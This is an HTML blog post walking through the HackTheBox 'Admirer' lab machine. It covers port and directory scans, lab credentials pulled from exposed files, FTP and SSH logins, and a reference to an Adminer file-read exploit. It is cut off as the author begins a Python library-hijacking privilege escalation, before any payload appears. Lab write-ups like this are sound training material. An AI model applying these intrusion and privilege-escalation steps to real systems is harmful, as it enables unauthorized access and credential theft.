@@ -1,0 +1,613 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <title>Acruxlare | HackTheBox - Admirer</title>
+  <meta name="description" content="Walkthrough of Admirer box on Hackthebox.">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <meta property="og:title" content="HackTheBox - Admirer">
+  <meta property="og:type" content="website">
+  <meta property="og:url" content="https://fumenoid.github.io/posts/hackthebox-admirer">
+  <meta property="og:description" content="Walkthrough of Admirer box on Hackthebox.">
+  <meta property="og:site_name" content="Acruxlare">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:url" content="https://fumenoid.github.io/posts/hackthebox-admirer">
+  <meta name="twitter:title" content="HackTheBox - Admirer">
+  <meta name="twitter:description" content="Walkthrough of Admirer box on Hackthebox.">
+
+  
+    
+      <meta property="og:image" content="https://fumenoid.github.io/assets/documentation/admirerthumb-fc7ad2aabdf0621a12afca0c31daf27fa9825bf3bc45048d320acbdce8351fa6.png">
+      <meta property="og:image:height" content="286">
+      <meta property="og:image:width" content="507">
+      <meta name="twitter:image" content="https://fumenoid.github.io/assets/documentation/admirerthumb-fc7ad2aabdf0621a12afca0c31daf27fa9825bf3bc45048d320acbdce8351fa6.png">
+      <meta name="twitter:card" content="summary_large_image">
+    
+  
+
+  <link href="https://fumenoid.github.io/feed.xml" type="application/rss+xml" rel="alternate" title="Acruxlare Last 10 blog posts" />
+
+  
+
+  
+
+    
+      <link rel="icon" type="image/x-icon" href="/assets/favicon-dark-f46876861f8611b1be1e40dbc82954f6ce18e041809dce43ba85794a93ef72e2.ico">
+      <link rel="apple-touch-icon" href="/assets/apple-touch-icon-dark-d161409442b7e523089f24d08d0a55951549ece7504207c376d53b020713494d.png">
+      <link rel="stylesheet" type="text/css" href="/assets/dark-831218bc9e41aef39ee6a0bae4501195bccafcc13101ae2b9cd20493a6ec04c0.css">
+    
+
+  
+
+</head>
+
+<body>
+  <main>
+    <div class="grid grid-centered">
+      <div class="grid-cell">
+        <nav class="header-nav scrollappear">
+  <a href="/" class="header-logo" title="Acruxlare">Acruxlare</a>
+  <ul class="header-links">
+    
+      <li>
+        <a href="/about" title="About me">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-about">
+  <use href="/assets/about-ecf154b571ab8034ae00aeed91a3b7ad68db80b46d958753ad6216c919486e88.svg#icon-about" xlink:href="/assets/about-ecf154b571ab8034ae00aeed91a3b7ad68db80b46d958753ad6216c919486e88.svg#icon-about"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+      <li>
+        <a href="https://twitter.com/fumenoid" rel="noreferrer noopener" target="_blank" title="Twitter">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-twitter">
+  <use href="/assets/twitter-8842c33965263ad1b03a978406826677a668f94125d5837e70ab83f24b3213a7.svg#icon-twitter" xlink:href="/assets/twitter-8842c33965263ad1b03a978406826677a668f94125d5837e70ab83f24b3213a7.svg#icon-twitter"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+    
+    
+      <li>
+        <a href="https://github.com/fumenoid" rel="noreferrer noopener" target="_blank" title="GitHub">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-github">
+  <use href="/assets/github-094f81040819f34343ee6ffff0980f17e2807b08b595eaaf66ae3554934fd78d.svg#icon-github" xlink:href="/assets/github-094f81040819f34343ee6ffff0980f17e2807b08b595eaaf66ae3554934fd78d.svg#icon-github"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+      <li>
+        <a href="mailto:fumenoid@gmail.com" title="Email">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-email">
+  <use href="/assets/email-782473193bf750036fdb90e8daa075508a20509d01854c09f3237c144a3f0601.svg#icon-email" xlink:href="/assets/email-782473193bf750036fdb90e8daa075508a20509d01854c09f3237c144a3f0601.svg#icon-email"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+    
+  </ul>
+</nav>
+
+
+  <ul class="header-tags scrollappear">
+    
+    
+      
+        <li><a href="/tag/forensics">Forensics</a></li>
+    
+      
+        <li><a href="/tag/hackthebox">Hackthebox</a></li>
+    
+      
+        <li><a href="/tag/programming">Programming</a></li>
+    
+      
+        <li><a href="/tag/sorcery">Sorcery</a></li>
+    
+      
+        <li><a href="/tag/tryhackme">Tryhackme</a></li>
+    
+  </ul>
+
+
+        <article class="article scrollappear">
+          <header class="article-header">
+            <h1>HackTheBox - Admirer</h1>
+            <p>Walkthrough of Admirer box on Hackthebox.</p>
+            <div class="article-list-footer">
+  <span class="article-list-date">
+    September 25, 2020
+  </span>
+  <span class="article-list-divider">-</span>
+  <span class="article-list-minutes">
+    
+    
+      11 minute read
+    
+  </span>
+  <span class="article-list-divider">-</span>
+  <div class="article-list-tags">
+    
+      
+      <a href="/tag/hackthebox" title="See all posts with tag 'hackthebox'">hackthebox</a>
+    
+  </div>
+</div>
+          </header>
+
+          <div class="article-content">
+            <p><a href="/assets/documentation/admirer-1f1807dff01d41c06ef904ae7c6f504af93b544ad9fe325a1d6ca316fd6f091d.webp">
+  <img src="/assets/documentation/admirer-1f1807dff01d41c06ef904ae7c6f504af93b544ad9fe325a1d6ca316fd6f091d.webp" alt="HTB Admirer" class="zooming" data-rjs="/assets/documentation/admirer-1f1807dff01d41c06ef904ae7c6f504af93b544ad9fe325a1d6ca316fd6f091d.webp" data-zooming-width="1200" data-zooming-height="675" />
+</a></p>
+
+<h2 id="htb---admirer">HTB - Admirer</h2>
+
+<p>IP - 10.10.10.187</p>
+
+<h3 id="overview">Overview</h3>
+
+<p>This box was an easy level linux box on HTB created by <a href="https://www.hackthebox.eu/home/users/profile/159204">polarbearer</a> and <a href="https://www.hackthebox.eu/home/users/profile/125033">GibParadox</a>, it started with finding a hidden directory in <code class="highlighter-rouge">robots.txt</code> named <code class="highlighter-rouge">admin-dir</code>, in which we find two txt files namely <code class="highlighter-rouge">contacts.txt</code> and <code class="highlighter-rouge">credentials.txt</code> using a gobuster scan with <code class="highlighter-rouge">-x txt</code>, then we use <code class="highlighter-rouge">ftpuser</code> creds obtained from <code class="highlighter-rouge">credentials.txt</code> to login to <code class="highlighter-rouge">FTP</code>. FTP server had the old source code of the website and on enumerating it we find a reference to using some open source database management utility, for out box it was <code class="highlighter-rouge">adminer</code>. On googling adminer exploits we find a exploit that let us read local files, we use that exploit to read <code class="highlighter-rouge">index.php</code> file, which had <code class="highlighter-rouge">creds</code>, we can use those creds to ssh as user <code class="highlighter-rouge">waldo</code>, root part was fun and it was a <code class="highlighter-rouge">Python Library Hijacking</code>.</p>
+
+<h3 id="enumeration">Enumeration</h3>
+
+<p>As always let’s start off with nmap script nmap -sC for default scripts <del>Alright, if it isn’t obvious yet I am a IPPSEC fanboi.</del> Aight, firing up nmap to scan all open ports on the box.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-oA</span> nmap/results 10.10.10.187</code></pre></figure>
+
+<p>And here is our nmap result</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2020-07-24 00:40 IST
+Nmap scan report <span class="k">for </span>10.10.10.187
+Host is up <span class="o">(</span>0.19s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 997 closed ports
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u7 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   2048 4a:71:e9:21:63:69:9d:cb:dd:84:02:1a:23:97:e1:b9 <span class="o">(</span>RSA<span class="o">)</span>
+|   256 c5:95:b6:21:4d:46:a4:25:55:7a:87:3e:19:a8:e7:02 <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 d0:2d:dd:d0:5c:42:f8:7b:31:5a:be:57:c4:a9:a7:56 <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp open  http    Apache httpd 2.4.25 <span class="o">((</span>Debian<span class="o">))</span>
+| http-robots.txt: 1 disallowed entry 
+|_/admin-dir
+|_http-server-header: Apache/2.4.25 <span class="o">(</span>Debian<span class="o">)</span>
+|_http-title: Admirer
+Service Info: OSs: Unix, Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>33.61 seconds</code></pre></figure>
+
+<p>Open services are SSH on port 22, webserver on port 80 and a FTP server on port 21. I checked for Anonymous access on the FTP server but it wasn’t allowed, so I am gonna shift my focus on the webserver.</p>
+
+<h4 id="enumerating-the-web-server">Enumerating the web server</h4>
+
+<p>The site looks like an image gallery.</p>
+
+<p><a href="/assets/documentation/admirerweb-a7cc2e632abe34260bf32b46046df24735bd2d744c7cc5fe00d730844fe491bf.webp">
+  <img src="/assets/documentation/admirerweb-a7cc2e632abe34260bf32b46046df24735bd2d744c7cc5fe00d730844fe491bf.webp" alt="HTB Admirer" class="zooming" data-rjs="/assets/documentation/admirerweb-a7cc2e632abe34260bf32b46046df24735bd2d744c7cc5fe00d730844fe491bf.webp" data-zooming-width="1366" data-zooming-height="713" />
+</a></p>
+
+<p>Alright let’s run something on backend and start exploring the website, because <code class="highlighter-rouge">we always want to keep some enumeration running while we manually look at that web server</code> <del>Told ya already, I am a ippsec fanboi</del>. So firing up the gobuster scan to find hidden directories, and I am also looking for txt and php files(incase we find some notes or some hidden webpage).</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">┌─[fumenoid@parrot]─[~/Desktop/Fumenoid/Pentest/HTB/Admirer]
+└──╼ <span class="nv">$gobuster</span> <span class="nb">dir</span> <span class="nt">-u</span> http://10.10.10.187 <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt <span class="nt">-x</span> txt,php <span class="nt">-o</span> gobuster_result <span class="nt">-t</span> 120</code></pre></figure>
+
+<h4 id="initial-foothold">Initial Foothold</h4>
+
+<p>During basic enumeration, I found a hidden directory in <code class="highlighter-rouge">/robots.txt</code> named <code class="highlighter-rouge">/admin-dir</code> but we can’t browse files in it, as the first gobuster scan wasn’t really fruitful so, I ran another gobuster scan in admin-dir directory and searching for <code class="highlighter-rouge">txt</code> and <code class="highlighter-rouge">php</code> files. <code class="highlighter-rouge">Note : robots.txt also had a username "waldo"</code>.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">┌─[fumenoid@parrot]─[~/Desktop/Fumenoid/Pentest/HTB/Admirer]
+└──╼ <span class="nv">$gobuster</span> <span class="nb">dir</span> <span class="nt">-u</span> http://10.10.10.187/admin-dir <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt <span class="nt">-x</span> txt,php <span class="nt">-o</span> gobuster_result <span class="nt">-t</span> 120
+<span class="o">===============================================================</span>
+Gobuster v3.0.1
+by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@_FireFart_<span class="o">)</span>
+<span class="o">===============================================================</span>
+<span class="o">[</span>+] Url:            http://10.10.10.187/admin-dir
+<span class="o">[</span>+] Threads:        120
+<span class="o">[</span>+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+<span class="o">[</span>+] Status codes:   200,204,301,302,307,401,403
+<span class="o">[</span>+] User Agent:     gobuster/3.0.1
+<span class="o">[</span>+] Extensions:     txt,php
+<span class="o">[</span>+] Timeout:        10s
+<span class="o">===============================================================</span>
+2020/09/25 19:53:55 Starting gobuster
+<span class="o">===============================================================</span>
+/contacts.txt
+/credentials.txt</code></pre></figure>
+
+<p>And got two files <code class="highlighter-rouge">contacts.txt</code> &amp; <code class="highlighter-rouge">credentials.txt</code>, <code class="highlighter-rouge">contacts.txt</code> had some emails and names and it was a nice rabbit hole, but in <code class="highlighter-rouge">credentials.txt</code> we found the ftp user’s credential.</p>
+
+<p><a href="/assets/documentation/admirercred-d128abfbc024afff0a17e1ca696478db58b19052ba390998c8e11a4b88ea1af3.webp">
+  <img src="/assets/documentation/admirercred-d128abfbc024afff0a17e1ca696478db58b19052ba390998c8e11a4b88ea1af3.webp" alt="HTB Admirer" class="zooming" data-rjs="/assets/documentation/admirercred-d128abfbc024afff0a17e1ca696478db58b19052ba390998c8e11a4b88ea1af3.webp" data-zooming-width="1366" data-zooming-height="714" />
+</a></p>
+
+<p><code class="highlighter-rouge">ftpuser : %n?4Wz}R$tTF7</code></p>
+
+<h4 id="foothold">Foothold</h4>
+
+<p>As now we have the creds of the <code class="highlighter-rouge">FTP</code> user, lets start enumerating that.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">┌─[fumenoid@parrot]─[~/Desktop/Fumenoid/Pentest/HTB/Admirer]
+└──╼ <span class="nv">$ftp</span> 10.10.10.187
+Connected to 10.10.10.187.
+220 <span class="o">(</span>vsFTPd 3.0.3<span class="o">)</span>
+Name <span class="o">(</span>10.10.10.187:fumenoid<span class="o">)</span>: ftpuser
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system <span class="nb">type </span>is UNIX.
+Using binary mode to transfer files.
+ftp&gt; mget <span class="k">*</span></code></pre></figure>
+
+<p>I simply downloaded all the files in the ftp server to analyse them.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">┌─[fumenoid@parrot]─[~/Desktop/Fumenoid/Pentest/HTB/Admirer/ftp]
+└──╼ <span class="nv">$ls</span> <span class="nt">-la</span>
+total 7168
+drwxr-xr-x 1 fumenoid fumenoid     158 Jul 24 03:36 <span class="nb">.</span>
+drwxr-xr-x 1 fumenoid fumenoid     148 Jul 24 03:46 ..
+drwxr-x--- 1 fumenoid fumenoid      34 Jun  7  2019 assets
+<span class="nt">-rw-r--r--</span> 1 fumenoid fumenoid    3405 Jul 24 03:16 dump.sql
+<span class="nt">-rw-r--r--</span> 1 fumenoid fumenoid 7321600 Jul 24 03:17 html.tar
+drwxr-x--- 1 fumenoid fumenoid      22 Dec  3  2019 images
+<span class="nt">-rw-r-----</span> 1 fumenoid fumenoid    4613 Dec  4  2019 index.php
+<span class="nt">-rw-r-----</span> 1 fumenoid fumenoid     134 Dec  2  2019 robots.txt
+drwxr-x--- 1 fumenoid fumenoid      92 Dec  2  2019 utility-scripts
+drwxr-x--- 1 fumenoid fumenoid      54 Dec  2  2019 w4ld0s_s3cr3t_d1r</code></pre></figure>
+
+<p>And it looks like backup of the code running on the webserver, In it there were many rabbit holes and a lot of passwords of mysql database, I tried using them with username <code class="highlighter-rouge">waldo</code> to ssh into the server but none of those passwords worked D:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">┌─[fumenoid@parrot]─[~/Desktop/Fumenoid/Pentest/HTB/Admirer/ftp/utility-scripts]
+└──╼ <span class="nv">$cat</span> db_admin.php 
+&lt;?php
+  <span class="nv">$servername</span> <span class="o">=</span> <span class="s2">"localhost"</span><span class="p">;</span>
+  <span class="nv">$username</span> <span class="o">=</span> <span class="s2">"waldo"</span><span class="p">;</span>
+  <span class="nv">$password</span> <span class="o">=</span> <span class="s2">"Wh3r3_1s_w4ld0?"</span><span class="p">;</span>
+
+  // Create connection
+  <span class="nv">$conn</span> <span class="o">=</span> new mysqli<span class="o">(</span><span class="nv">$servername</span>, <span class="nv">$username</span>, <span class="nv">$password</span><span class="o">)</span><span class="p">;</span>
+
+  // Check connection
+  <span class="k">if</span> <span class="o">(</span><span class="nv">$conn</span>-&gt;connect_error<span class="o">)</span> <span class="o">{</span>
+      die<span class="o">(</span><span class="s2">"Connection failed: "</span> <span class="nb">.</span> <span class="nv">$conn</span>-&gt;connect_error<span class="o">)</span><span class="p">;</span>
+  <span class="o">}</span>
+  <span class="nb">echo</span> <span class="s2">"Connected successfully"</span><span class="p">;</span>
+
+
+  // TODO: Finish implementing this or find a better open <span class="nb">source </span>alternative
+?&gt;</code></pre></figure>
+
+<p>In this file there is a <code class="highlighter-rouge">TODO</code> note, and as <code class="highlighter-rouge">db.php</code> is not present on current webserver, I assumed the box has some open source db management utility. After some basic enumeration I figured they are using <code class="highlighter-rouge">Adminer</code>, <em>the box name is based on this</em>.</p>
+
+<h3 id="getting-user">Getting User</h3>
+
+<p>I tried the passwords from the ftp directory in the adminer console, that was at <code class="highlighter-rouge">http://10.10.10.187/utility-scripts/adminer.php</code> but none of them worked D:</p>
+
+<p><a href="/assets/documentation/admireradminer-3ec56d950b4ed6f2c9cd0c9827289ccaebc5de9e7b195edaa82133bd1692b457.webp">
+  <img src="/assets/documentation/admireradminer-3ec56d950b4ed6f2c9cd0c9827289ccaebc5de9e7b195edaa82133bd1692b457.webp" alt="HTB Admirer" class="zooming" data-rjs="/assets/documentation/admireradminer-3ec56d950b4ed6f2c9cd0c9827289ccaebc5de9e7b195edaa82133bd1692b457.webp" data-zooming-width="1366" data-zooming-height="715" />
+</a></p>
+
+<p>Then I googled for Adminer’s exploit and reached <a href="https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool">here</a>, It’s a poc of an exploit that can be used to load local files on the server.</p>
+
+<p>For this we also need to allow remote access on mysql in our machine, I used this <a href="https://www.cyberciti.biz/tips/how-do-i-enable-remote-access-to-mysql-database-server.html">blog</a> to do it. Also thanks to <code class="highlighter-rouge">pop_eax</code> and <code class="highlighter-rouge">kreep</code> for giving me a nudge on this part. <em>Ngl mysql part was a bit annoying.</em></p>
+
+<p>Now we can use that above exploit to load files, I opened up <code class="highlighter-rouge">index.php</code> file in the source code and finally got the creds of the user waldo. <code class="highlighter-rouge">waldo : &amp;&lt;h5b~yK3F#{PaPB&amp;dA}{H&gt;</code> Now we can simply use these creds to SSH into the box.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">┌─[fumenoid@parrot]─[~/Desktop/Fumenoid/Pentest/HTB/Admirer]
+└──╼ <span class="nv">$ssh</span> waldo@10.10.10.187
+waldo@10.10.10.187 password: 
+Linux admirer 4.9.0-12-amd64 x86_64 GNU/Linux
+
+The programs included with the Devuan GNU/Linux system are free software<span class="p">;</span>
+the exact distribution terms <span class="k">for </span>each program are described <span class="k">in </span>the
+individual files <span class="k">in</span> /usr/share/doc/<span class="k">*</span>/copyright.
+
+Devuan GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+You have new mail.
+Last login: Wed Apr 29 10:56:59 2020 from 10.10.14.3
+waldo@admirer:~<span class="nv">$ </span><span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>waldo<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>waldo<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>waldo<span class="o">)</span>,1001<span class="o">(</span>admins<span class="o">)</span>
+waldo@admirer:~<span class="nv">$ </span><span class="nb">wc</span> <span class="nt">-c</span> user.txt 
+33 user.txt
+waldo@admirer:~<span class="err">$</span></code></pre></figure>
+
+<p><em>Sorry that I didn’t explain this part properly, I didn’t documented this box while initially doing it and I don’t want to solve this box again but I simply followed this blog to setup a remote mysql server and the exploit’s poc to load index.php file which had creds, so I guess writing them again won’t be really helpful.</em></p>
+
+<h3 id="rooting-the-box">Rooting the box</h3>
+
+<p>Alright, we are on the box as user <code class="highlighter-rouge">waldo</code> and we also have his password, so the first thing to check is for <code class="highlighter-rouge">sudo</code> perms.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">waldo@admirer:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
+<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>waldo: 
+Matching Defaults entries <span class="k">for </span>waldo on admirer:
+    env_reset, <span class="nv">env_file</span><span class="o">=</span>/etc/sudoenv, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin,
+    <span class="nv">listpw</span><span class="o">=</span>always
+
+User waldo may run the following commands on admirer:
+    <span class="o">(</span>ALL<span class="o">)</span> SETENV: /opt/scripts/admin_tasks.sh</code></pre></figure>
+
+<p>Let’s check what perms on <code class="highlighter-rouge">/opt/scripts/admin_tasks.sh</code> file.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">waldo@admirer:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span> /opt/scripts/admin_tasks.sh
+<span class="nt">-rwxr-xr-x</span> 1 root admins 2613 Dec  2  2019 /opt/scripts/admin_tasks.sh</code></pre></figure>
+
+<p>Ah.. we don’t have writeperm on that file D:<br />
+Alright, let’s read the code and analyse it.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">waldo@admirer:~<span class="nv">$ </span><span class="nb">cat</span> /opt/scripts/admin_tasks.sh
+<span class="c">#!/bin/bash</span>
+
+view_uptime<span class="o">()</span>
+<span class="o">{</span>
+    /usr/bin/uptime <span class="nt">-p</span>
+<span class="o">}</span>
+
+view_users<span class="o">()</span>
+<span class="o">{</span>
+    /usr/bin/w
+<span class="o">}</span>
+
+view_crontab<span class="o">()</span>
+<span class="o">{</span>
+    /usr/bin/crontab <span class="nt">-l</span>
+<span class="o">}</span>
+
+backup_passwd<span class="o">()</span>
+<span class="o">{</span>
+    <span class="k">if</span> <span class="o">[</span> <span class="s2">"</span><span class="nv">$EUID</span><span class="s2">"</span> <span class="nt">-eq</span> 0 <span class="o">]</span>
+    <span class="k">then
+        </span><span class="nb">echo</span> <span class="s2">"Backing up /etc/passwd to /var/backups/passwd.bak..."</span>
+        /bin/cp /etc/passwd /var/backups/passwd.bak
+        /bin/chown root:root /var/backups/passwd.bak
+        /bin/chmod 600 /var/backups/passwd.bak
+        <span class="nb">echo</span> <span class="s2">"Done."</span>
+    <span class="k">else
+        </span><span class="nb">echo</span> <span class="s2">"Insufficient privileges to perform the selected operation."</span>
+    <span class="k">fi</span>
+<span class="o">}</span>
+
+backup_shadow<span class="o">()</span>
+<span class="o">{</span>
+    <span class="k">if</span> <span class="o">[</span> <span class="s2">"</span><span class="nv">$EUID</span><span class="s2">"</span> <span class="nt">-eq</span> 0 <span class="o">]</span>
+    <span class="k">then
+        </span><span class="nb">echo</span> <span class="s2">"Backing up /etc/shadow to /var/backups/shadow.bak..."</span>
+        /bin/cp /etc/shadow /var/backups/shadow.bak
+        /bin/chown root:shadow /var/backups/shadow.bak
+        /bin/chmod 600 /var/backups/shadow.bak
+        <span class="nb">echo</span> <span class="s2">"Done."</span>
+    <span class="k">else
+        </span><span class="nb">echo</span> <span class="s2">"Insufficient privileges to perform the selected operation."</span>
+    <span class="k">fi</span>
+<span class="o">}</span>
+
+backup_web<span class="o">()</span>
+<span class="o">{</span>
+    <span class="k">if</span> <span class="o">[</span> <span class="s2">"</span><span class="nv">$EUID</span><span class="s2">"</span> <span class="nt">-eq</span> 0 <span class="o">]</span>
+    <span class="k">then
+        </span><span class="nb">echo</span> <span class="s2">"Running backup script in the background, it might take a while..."</span>
+        /opt/scripts/backup.py &amp;
+    <span class="k">else
+        </span><span class="nb">echo</span> <span class="s2">"Insufficient privileges to perform the selected operation."</span>
+    <span class="k">fi</span>
+<span class="o">}</span>
+
+backup_db<span class="o">()</span>
+<span class="o">{</span>
+    <span class="k">if</span> <span class="o">[</span> <span class="s2">"</span><span class="nv">$EUID</span><span class="s2">"</span> <span class="nt">-eq</span> 0 <span class="o">]</span>
+    <span class="k">then
+        </span><span class="nb">echo</span> <span class="s2">"Running mysqldump in the background, it may take a while..."</span>
+        <span class="c">#/usr/bin/mysqldump -u root admirerdb &gt; /srv/ftp/dump.sql &amp;</span>
+        /usr/bin/mysqldump <span class="nt">-u</span> root admirerdb <span class="o">&gt;</span> /var/backups/dump.sql &amp;
+    <span class="k">else
+        </span><span class="nb">echo</span> <span class="s2">"Insufficient privileges to perform the selected operation."</span>
+    <span class="k">fi</span>
+<span class="o">}</span>
+
+
+
+<span class="c"># Non-interactive way, to be used by the web interface</span>
+<span class="k">if</span> <span class="o">[</span> <span class="nv">$# </span><span class="nt">-eq</span> 1 <span class="o">]</span>
+<span class="k">then
+    </span><span class="nv">option</span><span class="o">=</span><span class="nv">$1</span>
+    <span class="k">case</span> <span class="nv">$option</span> <span class="k">in
+        </span>1<span class="p">)</span> view_uptime <span class="p">;;</span>
+        2<span class="p">)</span> view_users <span class="p">;;</span>
+        3<span class="p">)</span> view_crontab <span class="p">;;</span>
+        4<span class="p">)</span> backup_passwd <span class="p">;;</span>
+        5<span class="p">)</span> backup_shadow <span class="p">;;</span>
+        6<span class="p">)</span> backup_web <span class="p">;;</span>
+        7<span class="p">)</span> backup_db <span class="p">;;</span>
+
+        <span class="k">*</span><span class="p">)</span> <span class="nb">echo</span> <span class="s2">"Unknown option."</span> <span class="o">&gt;</span>&amp;2
+    <span class="k">esac
+
+    </span><span class="nb">exit </span>0
+<span class="k">fi</span>
+
+
+<span class="c"># Interactive way, to be called from the command line</span>
+<span class="nv">options</span><span class="o">=(</span><span class="s2">"View system uptime"</span>
+         <span class="s2">"View logged in users"</span>
+         <span class="s2">"View crontab"</span>
+         <span class="s2">"Backup passwd file"</span>
+         <span class="s2">"Backup shadow file"</span>
+         <span class="s2">"Backup web data"</span>
+         <span class="s2">"Backup DB"</span>
+         <span class="s2">"Quit"</span><span class="o">)</span>
+
+<span class="nb">echo
+echo</span> <span class="s2">"[[[ System Administration Menu ]]]"</span>
+<span class="nv">PS3</span><span class="o">=</span><span class="s2">"Choose an option: "</span>
+<span class="nv">COLUMNS</span><span class="o">=</span>11
+<span class="k">select </span>opt <span class="k">in</span> <span class="s2">"</span><span class="k">${</span><span class="nv">options</span><span class="p">[@]</span><span class="k">}</span><span class="s2">"</span><span class="p">;</span> <span class="k">do
+    case</span> <span class="nv">$REPLY</span> <span class="k">in
+        </span>1<span class="p">)</span> view_uptime <span class="p">;</span> <span class="nb">break</span> <span class="p">;;</span>
+        2<span class="p">)</span> view_users <span class="p">;</span> <span class="nb">break</span> <span class="p">;;</span>
+        3<span class="p">)</span> view_crontab <span class="p">;</span> <span class="nb">break</span> <span class="p">;;</span>
+        4<span class="p">)</span> backup_passwd <span class="p">;</span> <span class="nb">break</span> <span class="p">;;</span>
+        5<span class="p">)</span> backup_shadow <span class="p">;</span> <span class="nb">break</span> <span class="p">;;</span>
+        6<span class="p">)</span> backup_web <span class="p">;</span> <span class="nb">break</span> <span class="p">;;</span>
+        7<span class="p">)</span> backup_db <span class="p">;</span> <span class="nb">break</span> <span class="p">;;</span>
+        8<span class="p">)</span> <span class="nb">echo</span> <span class="s2">"Bye!"</span> <span class="p">;</span> <span class="nb">break</span> <span class="p">;;</span>
+
+        <span class="k">*</span><span class="p">)</span> <span class="nb">echo</span> <span class="s2">"Unknown option."</span> <span class="o">&gt;</span>&amp;2
+    <span class="k">esac
+done
+
+</span><span class="nb">exit </span>0</code></pre></figure>
+
+<p>Seems like we can run some simple checks as well as do some basic backup operations, tho intresting part is the web backup, as here we are calling running a python script.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">...
+backup_web<span class="o">()</span>
+<span class="o">{</span>
+    <span class="k">if</span> <span class="o">[</span> <span class="s2">"</span><span class="nv">$EUID</span><span class="s2">"</span> <span class="nt">-eq</span> 0 <span class="o">]</span>
+    <span class="k">then
+        </span><span class="nb">echo</span> <span class="s2">"Running backup script in the background, it might take a while..."</span>
+        /opt/scripts/backup.py &amp;  <span class="c"># A PYTHON SCRIPT </span>
+    <span class="k">else
+        </span><span class="nb">echo</span> <span class="s2">"Insufficient privileges to perform the selected operation."</span>
+    <span class="k">fi</span>
+<span class="o">}</span>
+...</code></pre></figure>
+
+<p>On checking that python script, we can see it is importing an additional library named <code class="highlighter-rouge">shutil</code>.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">waldo@admirer:~<span class="nv">$ </span><span class="nb">cat</span> /opt/scripts/backup.py
+<span class="c">#!/usr/bin/python3</span>
+
+from shutil import make_archive
+
+src <span class="o">=</span> <span class="s1">'/var/www/html/'</span>
+
+<span class="c"># old ftp directory, not used anymore</span>
+<span class="c">#dst = '/srv/ftp/html'</span>
+
+dst <span class="o">=</span> <span class="s1">'/var/backups/html'</span>
+
+make_archive<span class="o">(</span>dst, <span class="s1">'gztar'</span>, src<span class="o">)</span></code></pre></figure>
+
+<p>Which means we can do a <code class="highlighter-rouge">Python library hijacking</code>, here is two blogs, by <a href="https://rastating.github.io/privilege-escalation-via-python-library-hijacking/">rastating</a> and a medium blog by <a href="https://medium.com/@klockw3rk/privilege-escalation-hijacking-python-library-2a0e92a45ca7">klockw3rk</a> that I refered to, to understand the basic concept.</p>
+
+<p>Alright so first I created a fake library named <code class="highlighter-rouge">shutil.py</code> with a function <code class="highlighter-rouge">make_archive</code> in <code class="highlighter-rouge">/tmp</code> directory which had our reverse shell payload.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">waldo@admirer:/tmp<span class="nv">$ </span><span class="nb">mkdir </span>temp
+waldo@admirer:/tmp<span class="nv">$ </span><span class="nb">cd </span>temp
+waldo@admirer:/tmp/temp<span class="nv">$ </span>vi shutil.py
